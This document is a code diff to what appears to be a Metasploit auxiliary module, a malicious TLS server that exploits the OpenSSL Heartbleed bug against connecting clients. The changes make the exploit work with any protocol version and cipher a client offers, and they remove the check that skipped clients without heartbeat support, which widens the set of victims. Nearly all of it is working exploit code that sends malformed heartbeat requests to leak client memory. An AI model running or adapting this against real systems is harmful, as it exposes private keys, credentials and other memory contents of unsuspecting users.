@@ -16,7 +16,7 @@ class Metasploit3 < Msf::Auxiliary
       'Description'    => %q{
         This module provides a fake SSL service that is intended to
         leak memory from client systems as they connect. This module is
-        hardcoded for TLS/1.1 using the AES-128-CBC-SHA1 cipher.
+        hardcoded for using the AES-128-CBC-SHA1 cipher.
       },
       'Author'         =>
         [
@@ -128,7 +128,7 @@ class Metasploit3 < Msf::Auxiliary
 
   # Process cleartext TLS messages
   def process_openssl_cleartext_request(c, data)
-    message_type, message_version = data.unpack("Cn")
+    message_type, message_version, protocol_version = data.unpack("Cn@9n")
 
     if message_type == 0x15 and data.length >= 7
       message_level, message_reason = data[5,2].unpack("CC")
@@ -160,19 +160,12 @@ class Metasploit3 < Msf::Auxiliary
 
       print_status("#{@state[c][:name]} Processing Client Hello...")
 
-      # Ignore clients that do not support heartbeat requests
-      unless data.index("\x0F\x00\x01\x01")
-        print_status("#{@state[c][:name]} Client does not support heartbeats")
-        c.close
-        return
-      end
-
       # Extract the client_random needed to compute the master key
       @state[c][:client_random]  = data[11,32]
       @state[c][:received_hello] = true
 
       print_status("#{@state[c][:name]} Sending Server Hello...")
-      openssl_send_server_hello(c, data)
+      openssl_send_server_hello(c, data, protocol_version)
       return
     end
 
@@ -203,7 +196,7 @@ class Metasploit3 < Msf::Auxiliary
     else
       # Send heartbeat requests
       if @state[c][:heartbeats].length < heartbeat_limit
-        openssl_send_heartbeat(c)
+        openssl_send_heartbeat(c, protocol_version)
       end
 
       # Process cleartext heartbeat replies
@@ -223,7 +216,7 @@ class Metasploit3 < Msf::Auxiliary
 
   # Process encrypted TLS messages
   def process_openssl_encrypted_request(c, data)
-    message_type, message_version = data.unpack("Cn")
+    message_type, message_version, protocol_version = data.unpack("Cn@9n")
 
     return if @state[c][:shutdown]
     return unless data.length > 5
@@ -244,7 +237,7 @@ class Metasploit3 < Msf::Auxiliary
 
     # Send heartbeat requests
     if @state[c][:heartbeats].length < heartbeat_limit
-      openssl_send_heartbeat(c)
+      openssl_send_heartbeat(c, protocol_version)
     end
 
     # Process heartbeat replies
@@ -305,47 +298,55 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # Send an OpenSSL Server Hello response
-  def openssl_send_server_hello(c, hello)
+  def openssl_send_server_hello(c, hello, version)
+
+    # If encrypted, use the TLS_RSA_WITH_AES_128_CBC_SHA; otherwise, use the
+    # first cipher suite sent by the client.
+    if @state[c][:encrypted]
+      cipher = "\x00\x2F"
+    else
+      cipher = hello[46, 2]
+    end
 
     # Create the Server Hello response
     extensions =
       "\x00\x0f\x00\x01\x01"       # Heartbeat
 
     server_hello_payload =
-      "\x03\x02" +                 # TLS Version 1.1
+      [version].pack('n') +        # Use the protocol version sent by the client.
       @state[c][:server_random] +  # Random (Timestamp + Random Bytes)
       "\x00" +                     # Session ID
-      "\x00\x2F" +                 # Cipher ID (TLS_RSA_WITH_AES_128_CBC_SHA)
+      cipher +                     # Cipher ID (TLS_RSA_WITH_AES_128_CBC_SHA)
       "\x00" +                     # Compression Method (none)
       [extensions.length].pack('n') + extensions
 
     server_hello = [0x02].pack("C") + [ server_hello_payload.length ].pack("N")[1,3] + server_hello_payload
 
-    msg1 = "\x16\x03\x02" + [server_hello.length].pack("n") + server_hello
+    msg1 = "\x16" + [version].pack('n') + [server_hello.length].pack("n") + server_hello
     c.put(msg1)
 
     # Skip the rest of TLS if we arent negotiating it
     unless negotiate_tls?
       # Send a heartbeat request to start the stream and return
-      openssl_send_heartbeat(c)
+      openssl_send_heartbeat(c, version)
       return
     end
 
     # Certificates
     certs_combined = generate_certificates
     pay2 = "\x0b" + [ certs_combined.length + 3 ].pack("N")[1, 3] + [ certs_combined.length ].pack("N")[1, 3] + certs_combined
-    msg2 = "\x16\x03\x02" + [pay2.length].pack("n") + pay2
+    msg2 = "\x16" + [version].pack('n') + [pay2.length].pack("n") + pay2
     c.put(msg2)
 
     # End of Server Hello
     pay3 = "\x0e\x00\x00\x00"
-    msg3 = "\x16\x03\x02" + [pay3.length].pack("n") + pay3
+    msg3 = "\x16" + [version].pack('n') + [pay3.length].pack("n") + pay3
     c.put(msg3)
   end
 
   # Send the heartbeat request that results in memory exposure
-  def openssl_send_heartbeat(c)
-    c.put "\x18\x03\x02\x00\x03\x01" + [heartbeat_read_size].pack("n")
+  def openssl_send_heartbeat(c, version)
+    c.put "\x18" + [version].pack('n') + "\x00\x03\x01" + [heartbeat_read_size].pack("n")
   end
 
   # Pack the certificates for use in the TLS reply
